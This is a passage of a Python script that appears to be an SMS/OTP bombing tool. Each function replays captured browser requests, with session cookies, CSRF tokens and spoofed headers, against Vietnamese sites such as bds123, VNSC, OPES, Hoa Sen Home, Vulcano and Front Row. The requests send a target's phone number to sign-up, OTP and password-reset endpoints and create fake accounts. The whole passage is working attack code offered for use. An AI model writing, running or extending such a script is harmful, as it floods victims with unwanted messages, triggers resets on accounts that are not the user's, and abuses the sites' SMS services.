        # 'cookie': 'district_current=eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D; province_current=eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D; app_version=eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D; twk_idm_key=-fP0gtADxbThAvD-wV1oU; XSRF-TOKEN=eyJpdiI6IkYzSU5zRHRkTXJhd0VNdHg0ZTUvSWc9PSIsInZhbHVlIjoidzlwV2x5SWQyTk4vd0lqZFdOMkFNZU82ZW1YOVVnYzNBVkJkckIyTXdmNzI1Q1RqUUw1dHNoODg5c2RSNmY2aGlCWkRZV2F1VWRRR2pWUlMyK3k1OE5PRU1FcTRMcER2dVRGVTJ0MkdQVGdwYnBhaHZKZ1F2ZGJOZHp3V0dSUmYiLCJtYWMiOiI3NjA2NzU4MmQ4M2EyZWFiM2IyMTUxYmY4MzMzZWUzYTRhNWRlNTdjYjhkNjI5NGYzOWVjODAyOGM3YTkxZDhjIiwidGFnIjoiIn0%3D; bds123=6diLux24LxPKQx1NKLATa2NB9Q4y43ulG0nTd3Ua; TawkConnectionTime=0; twk_uuid_5cda768ad07d7e0c63937723=%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080324271%7D',
        'origin': 'https://bds123.vn',
        'priority': 'u=1, i',
        'referer': 'https://bds123.vn/dang-ky.html?ref=aHR0cHM6Ly9iZHMxMjMudm4vY2hvLXRodWUtcGhvbmctdHJvLW5oYS10cm8taGEtbm9pLmh0bWw%3D',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'rcv27PayIN9vVSoLE2LugmP5XgFOFsDLEzrqOilN',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'fullname': 'tran quoc ujy',
        'phone': sdt,
        'password': '123123aA@',
        'user_type': '1',
        'redirect': 'https://bds123.vn/cho-thue-phong-tro-nha-tro-ha-noi.html',
    }

    response = requests.post('https://bds123.vn/api/user/register', cookies=cookies, headers=headers, data=data)

    cookies = {
        'district_current': 'eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D',
        'province_current': 'eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D',
        'app_version': 'eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D',
        'twk_idm_key': '-fP0gtADxbThAvD-wV1oU',
        'XSRF-TOKEN': 'eyJpdiI6IjdmcVBQd3dWUXRLVUFPZnZnUjJIcHc9PSIsInZhbHVlIjoiYzB2SnQvbWxRS0RwRjVEbVB0a2RHbjBPeU41MlJFS1B2cCswWm9WM2k3aHB3ZHFidXhrM0ZNNHliTDA2MUIvamsrYnRBZ29DVVdSMEVBN3djU1l4cThGbnBJdjNvMFowem5uKy9XcDVPVFdGNGdwR3kzWXVacmdnZisxQmFsbG4iLCJtYWMiOiJmMWIyOTc4YjdmNzc5MTk2YWM4YzRiNzUxZjE4ZmY3Nzc2Yjg0NTg0Mjk5MGI0OGRhYjc0MjA4YzJjOGRmYjYzIiwidGFnIjoiIn0%3D',
        'bds123': 'tFunfHKzAWvLlUnHCQkNjJ1KITowsfhgaQz4Zjk1',
        'TawkConnectionTime': '0',
        'twk_uuid_5cda768ad07d7e0c63937723': '%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080347759%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'district_current=eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D; province_current=eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D; app_version=eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D; twk_idm_key=-fP0gtADxbThAvD-wV1oU; XSRF-TOKEN=eyJpdiI6IjdmcVBQd3dWUXRLVUFPZnZnUjJIcHc9PSIsInZhbHVlIjoiYzB2SnQvbWxRS0RwRjVEbVB0a2RHbjBPeU41MlJFS1B2cCswWm9WM2k3aHB3ZHFidXhrM0ZNNHliTDA2MUIvamsrYnRBZ29DVVdSMEVBN3djU1l4cThGbnBJdjNvMFowem5uKy9XcDVPVFdGNGdwR3kzWXVacmdnZisxQmFsbG4iLCJtYWMiOiJmMWIyOTc4YjdmNzc5MTk2YWM4YzRiNzUxZjE4ZmY3Nzc2Yjg0NTg0Mjk5MGI0OGRhYjc0MjA4YzJjOGRmYjYzIiwidGFnIjoiIn0%3D; bds123=tFunfHKzAWvLlUnHCQkNjJ1KITowsfhgaQz4Zjk1; TawkConnectionTime=0; twk_uuid_5cda768ad07d7e0c63937723=%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080347759%7D',
        'origin': 'https://bds123.vn',
        'priority': 'u=1, i',
        'referer': 'https://bds123.vn/xac-thuc-tai-khoan.html?ref=aHR0cHM6Ly9iZHMxMjMudm4v',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'rcv27PayIN9vVSoLE2LugmP5XgFOFsDLEzrqOilN',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_or_email': sdt,
        'action': 'verify',
    }

    try:
        response = requests.post('https://bds123.vn/api/user/send-token', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BDS123 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BDS123 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vnsc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://invest.vnsc.vn',
        'priority': 'u=1, i',
        'referer': 'https://invest.vnsc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'type': 'PHONE_VERIFICATION_OTP',
        'phone': sdt,
        'email': '',
    }

    try:
        response = requests.post('https://api.vinasecurities.com/auth/v1/otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VNSC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VNSC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def opes():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer',
        'o-chn': 'opes-website',
        'o-client-id': 'c73894f9018617b8f00f741642e0dba3b53a2660ae1977b5efd1b65a99af67f3',
        'o-gid': 'og.532b1985-a43e-4137-9fdb-0ca63dbd83a2',
        'origin': 'https://opes.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'userName': sdt,
    }

    try:
        response = requests.get('https://website-api.opes.com.vn/api/auth/register-request-otp', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("OPES | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("OPES | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hoasenhome():
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://hoasenhome.vn',
        'Referer': 'https://hoasenhome.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-Store': 'default',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'customer': {
            'email': '',
            'firstname': 'quoc ujy',
            'lastname': 'tran',
            'dob': '11/02/1991',
            'gender': '1',
            'website_id': '1',
            'extension_attributes': {
                'telephone': sdt,
            },
        },
        'password': '123123aA',
        'guestQuoteId': 'dzudpF9Vja1PT1TaeHW0s09DnqxfjZkM',
        'isSubscribed': True,
    }


    response = requests.post('https://admin.hoasenhome.vn/rest/V1/service/customers/signup', headers=headers, json=json_data)

    headers = {
    'Accept': 'application/json',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://hoasenhome.vn',
    'Referer': 'https://hoasenhome.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    'X-Requested-Store': 'default',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://admin.hoasenhome.vn/rest/V1/customers/sms/forgot-password', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOASENHOME | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOASENHOME | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vulcano():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IkJ6Q2tWTzFybXAyU3V1UEVwYlBkM0E9PSIsInZhbHVlIjoiU2ZWd3cxSDVLdkVVMlB3dUZSQVBxNXFNcm9sVkYwTmhsOWY1V1BzajZBVFpOT0RGVU5aRm45M1MyQk9SYjhMU0JBWHRPaEhkeWZCT2hCZjdJbnd5SmE0Y0dDN2NaOTUwUzlHcEU1Qlhmc2JDSENXbG5QYW1GS3Z0aUlHazdUOEYiLCJtYWMiOiJmNmY4NzgxZjY5MzgwZWFkY2MxMDJiOTdlMDE5ZWQzOTEwZTI1YzMzNmUzMWQ0ZTU4YTc0YmZiZGEyZDk3YmU5IiwidGFnIjoiIn0%3D',
        'vulcanovn_session': 'eyJpdiI6InNqK3ZGZ3Z1OGQ3SG03aWVhRXJ6Znc9PSIsInZhbHVlIjoiMThzZ0llcXhNTTBzaTRZYlNyVlRPS0o4K1BqNnI4T0lNSXRaT0cycFpJRms1dS9qNFRIN0FUZnZPSm4rRW9TazJZR013WG1FeWxjU0pjWHFYOHRVd1hIRG9LbngzNFNPMWtNUXAxdGIxWkR6bGJkcklldXlpVVBWNm9oRytXaUwiLCJtYWMiOiJkYzFjZDAyODA0YzM0MzkxYjcxMWIyMDgyNjc3Y2Y3ZDAxMzVjMTIwZGE0YTFiNmUwNmVjZmQ1ZGM1ZjBiMzM5IiwidGFnIjoiIn0%3D',
        'utm_values': 'eyJpdiI6Ii9DS0t3SDRQZHdSME9RLzJUTlVadXc9PSIsInZhbHVlIjoiUWxodC9zUnl4SkVVOGFZY3QvUmVmZnhBUHhDSzl1NGx1K2gyV0ZqUjFkTEQxeVdVR0lNQ0dna3R3dmVFQmYvVyIsIm1hYyI6IjQ0NjNkZDMzMThkNTVmNjAwYmYzMTJmYTBhODk5NjM2NGIxZDczNGI5NGRlYWZlYmMxYWMzYWU4NjkzNGY5MGUiLCJ0YWciOiIifQ%3D%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IkJ6Q2tWTzFybXAyU3V1UEVwYlBkM0E9PSIsInZhbHVlIjoiU2ZWd3cxSDVLdkVVMlB3dUZSQVBxNXFNcm9sVkYwTmhsOWY1V1BzajZBVFpOT0RGVU5aRm45M1MyQk9SYjhMU0JBWHRPaEhkeWZCT2hCZjdJbnd5SmE0Y0dDN2NaOTUwUzlHcEU1Qlhmc2JDSENXbG5QYW1GS3Z0aUlHazdUOEYiLCJtYWMiOiJmNmY4NzgxZjY5MzgwZWFkY2MxMDJiOTdlMDE5ZWQzOTEwZTI1YzMzNmUzMWQ0ZTU4YTc0YmZiZGEyZDk3YmU5IiwidGFnIjoiIn0%3D; vulcanovn_session=eyJpdiI6InNqK3ZGZ3Z1OGQ3SG03aWVhRXJ6Znc9PSIsInZhbHVlIjoiMThzZ0llcXhNTTBzaTRZYlNyVlRPS0o4K1BqNnI4T0lNSXRaT0cycFpJRms1dS9qNFRIN0FUZnZPSm4rRW9TazJZR013WG1FeWxjU0pjWHFYOHRVd1hIRG9LbngzNFNPMWtNUXAxdGIxWkR6bGJkcklldXlpVVBWNm9oRytXaUwiLCJtYWMiOiJkYzFjZDAyODA0YzM0MzkxYjcxMWIyMDgyNjc3Y2Y3ZDAxMzVjMTIwZGE0YTFiNmUwNmVjZmQ1ZGM1ZjBiMzM5IiwidGFnIjoiIn0%3D; utm_values=eyJpdiI6Ii9DS0t3SDRQZHdSME9RLzJUTlVadXc9PSIsInZhbHVlIjoiUWxodC9zUnl4SkVVOGFZY3QvUmVmZnhBUHhDSzl1NGx1K2gyV0ZqUjFkTEQxeVdVR0lNQ0dna3R3dmVFQmYvVyIsIm1hYyI6IjQ0NjNkZDMzMThkNTVmNjAwYmYzMTJmYTBhODk5NjM2NGIxZDczNGI5NGRlYWZlYmMxYWMzYWU4NjkzNGY5MGUiLCJ0YWciOiIifQ%3D%3D',
        'origin': 'https://vulcano.vn',
        'priority': 'u=1, i',
        'referer': 'https://vulcano.vn/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': '9Dhr621QSdLEIjaiPEWHx7SUutyy28qa30K6ddsd',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://vulcano.vn/verify/send/code/register', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VULCANO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VULCANO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vulcanoreset():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6InFORmE5Yzc2Q0hOOTRLS1JtbjFvRnc9PSIsInZhbHVlIjoiRnU1Qy9sdnI5WnlZZ1VYSU9XMVR1eUtNeUhlYWRac2N5dHljakVmRmRXMjlaQUlmMWFtY3AyVEdRVitHcVNJSFpldUV4ajQ4UC91NnFxS0NBZ21lRUNkeGlYSGxhTDFjYXFUOWRobStUOGhiWk5mM3dtV3hwZjE1R2lzaDdwQlkiLCJtYWMiOiI2YTA5NjQwYzllNGE2ZTQyM2JmMzdlY2M5NTJkMmRhZDJjNGFjY2VhNzRiMWYyMTExZmVjNzE5ODMyZTgwM2JkIiwidGFnIjoiIn0%3D',
        'vulcanovn_session': 'eyJpdiI6IjhIZ3krcHZOK3F5OWx2VVVvd0Y1cmc9PSIsInZhbHVlIjoiaWJhWnM4VUN0SDE2MnlDYTlMSFVHRzFlYnVXZ1BqNWJsYk5Cblk3ckR4ZGdwVVVCQmxOMzhvL3ZGWUgvbitZaTdnbnU3STB3Yzc0OFZpWElHUnJQeVp1bFVldGVlTlZBS0kzZGtNQ2ptMmdhUDVFckFTUjUyWVBsbTgwSUdDOTQiLCJtYWMiOiI2ZTMyZjQ2ZjFhYmY5ZjQ0MTQzNjAzMGI5Mjg3NjM2NjkyNWNhMTAxZWI0NDFiYzkwMDhmZTdlYjMzZjhlYjA4IiwidGFnIjoiIn0%3D',
        'utm_values': 'eyJpdiI6IkQ2dHVKT3poMkhkMUlQY2NmMHNLNmc9PSIsInZhbHVlIjoidndvekp5aU8zYmpoaWt4ZVZCVHF0KzMwTlQrdklWMThvNXZydnlwbDV3VW9Fa3Z0Z3FrOEY2N1gwMjNGbGxNTSIsIm1hYyI6ImRjNDQ1MWZmOTQ3ZGNmYjhjNzFiMDk0NmY4MzZiMDg2ZjgxMTZkMDkxOTJkNTJlMDRlZTQxNjM1ZDhlYjAzYmYiLCJ0YWciOiIifQ%3D%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6InFORmE5Yzc2Q0hOOTRLS1JtbjFvRnc9PSIsInZhbHVlIjoiRnU1Qy9sdnI5WnlZZ1VYSU9XMVR1eUtNeUhlYWRac2N5dHljakVmRmRXMjlaQUlmMWFtY3AyVEdRVitHcVNJSFpldUV4ajQ4UC91NnFxS0NBZ21lRUNkeGlYSGxhTDFjYXFUOWRobStUOGhiWk5mM3dtV3hwZjE1R2lzaDdwQlkiLCJtYWMiOiI2YTA5NjQwYzllNGE2ZTQyM2JmMzdlY2M5NTJkMmRhZDJjNGFjY2VhNzRiMWYyMTExZmVjNzE5ODMyZTgwM2JkIiwidGFnIjoiIn0%3D; vulcanovn_session=eyJpdiI6IjhIZ3krcHZOK3F5OWx2VVVvd0Y1cmc9PSIsInZhbHVlIjoiaWJhWnM4VUN0SDE2MnlDYTlMSFVHRzFlYnVXZ1BqNWJsYk5Cblk3ckR4ZGdwVVVCQmxOMzhvL3ZGWUgvbitZaTdnbnU3STB3Yzc0OFZpWElHUnJQeVp1bFVldGVlTlZBS0kzZGtNQ2ptMmdhUDVFckFTUjUyWVBsbTgwSUdDOTQiLCJtYWMiOiI2ZTMyZjQ2ZjFhYmY5ZjQ0MTQzNjAzMGI5Mjg3NjM2NjkyNWNhMTAxZWI0NDFiYzkwMDhmZTdlYjMzZjhlYjA4IiwidGFnIjoiIn0%3D; utm_values=eyJpdiI6IkQ2dHVKT3poMkhkMUlQY2NmMHNLNmc9PSIsInZhbHVlIjoidndvekp5aU8zYmpoaWt4ZVZCVHF0KzMwTlQrdklWMThvNXZydnlwbDV3VW9Fa3Z0Z3FrOEY2N1gwMjNGbGxNTSIsIm1hYyI6ImRjNDQ1MWZmOTQ3ZGNmYjhjNzFiMDk0NmY4MzZiMDg2ZjgxMTZkMDkxOTJkNTJlMDRlZTQxNjM1ZDhlYjAzYmYiLCJ0YWciOiIifQ%3D%3D',
        'origin': 'https://vulcano.vn',
        'priority': 'u=0, i',
        'referer': 'https://vulcano.vn/forgot-password',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_token': '9Dhr621QSdLEIjaiPEWHx7SUutyy28qa30K6ddsd',
        'phone_or_email': sdt,
    }

    try:
        response = requests.post('https://vulcano.vn/password/send', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VULCANORESET | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VULCANORESET | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def frontrow():
    cookies = {
        'PHPSESSID': 'tafp43hvfnof37djk04o1ghkui',
        'form_key': 'H7L5n8XwH2yMeSgY',
        'mage-banners-cache-storage': '%7B%7D',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'form_key': 'H7L5n8XwH2yMeSgY',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'wishlist': 'gLEDyWwVr7acVuNlapJtOZWJ1kzBuQoK',
        'mgn_menu_category_13': '20',
        'mage-messages': '',
        'private_content_version': 'a0b4f1a78a7be530b28ac99fe6953ce9',
        'section_data_ids': '%7B%22customer%22%3A1723353049%2C%22wishlist%22%3A1723353050%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=tafp43hvfnof37djk04o1ghkui; form_key=H7L5n8XwH2yMeSgY; mage-banners-cache-storage=%7B%7D; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=H7L5n8XwH2yMeSgY; mage-cache-sessid=true; recently_viewed_product=%7B%7D; product_data_storage=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; wishlist=gLEDyWwVr7acVuNlapJtOZWJ1kzBuQoK; mgn_menu_category_13=20; mage-messages=; private_content_version=a0b4f1a78a7be530b28ac99fe6953ce9; section_data_ids=%7B%22customer%22%3A1723353049%2C%22wishlist%22%3A1723353050%7D',
        'origin': 'https://front-row.com',
        'priority': 'u=1, i',
        'referer': 'https://front-row.com/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': sdt_chuyen_doi,
        'country_code': '+84',
        'form_key': 'H7L5n8XwH2yMeSgY',
        'currentUrl': 'https://front-row.com/customer/account/create/',
    }

    try:
        response = requests.post('https://front-row.com/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
